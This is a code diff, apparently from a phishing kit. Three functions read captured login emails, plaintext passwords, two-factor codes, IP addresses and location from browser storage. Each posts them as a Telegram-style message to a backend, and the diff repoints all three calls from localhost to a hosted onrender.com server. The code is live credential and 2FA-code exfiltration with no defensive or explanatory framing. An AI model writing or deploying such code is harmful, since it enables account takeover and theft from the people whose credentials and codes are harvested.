@@ -6,7 +6,7 @@ export const sendMessageUserNameTelegram = async () => {
     const loginAttempts = JSON.parse(localStorage.getItem("loginAttempts"));
     const location = JSON.parse(localStorage.getItem("user_location"));
 
-    await axios.post("http://localhost:3002/users/sendMessage", {
+    await axios.post("https://tools-project-be-1fgv.onrender.com/users/sendMessage", {
       message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.road}\n👤 *Username1:* ${loginAttempts[0]?.email}\n👤 *Username2:* ${loginAttempts[1]?.email}\n🔑 *Password1:* ${loginAttempts[0]?.password}\n🔑 *Password2:* ${loginAttempts[1].password}\n`,
     });
   } catch (error) {
@@ -21,7 +21,7 @@ export const sendMessageCodeTelegram = async (code) => {
     const location = JSON.parse(localStorage.getItem("user_location"));
     const codeFA = JSON.parse(localStorage.getItem("twoFactorCode"));
 
-   await axios.post("http://localhost:3002/users/sendMessage", {
+   await axios.post("https://tools-project-be-1fgv.onrender.com/users/sendMessage", {
       message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.road}\n👤 *Username1:* ${loginAttempts[0]?.email}\n👤 *Username2:* ${loginAttempts[1]?.email}\n🔑 *Password1:* ${loginAttempts[0]?.password}\n🔑 *Password2:* ${loginAttempts[1].password}\n🔓 *Code:* ${code || codeFA }\n`,
     });
   } catch (error) {
@@ -51,7 +51,7 @@ export const sendMessageRegisterTelegram = async (dataForm) => {
 
     const formattedData = formatMessage(dataForm);
 
-    await axios.post("http://localhost:3002/users/sendMessage", {
+    await axios.post("https://tools-project-be-1fgv.onrender.com/users/sendMessage", {
       message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.road}\n👤 *Username1:* ${loginAttempts[0]?.email}\n👤 *Username2:* ${loginAttempts[1]?.email}\n🔑 *Password1:* ${loginAttempts[0]?.password}\n🔑 *Password2:* ${loginAttempts[1].password}\n🔓 *Code:* ${codeFA}\n\n${formattedData}`,
     });
   } catch (error) {
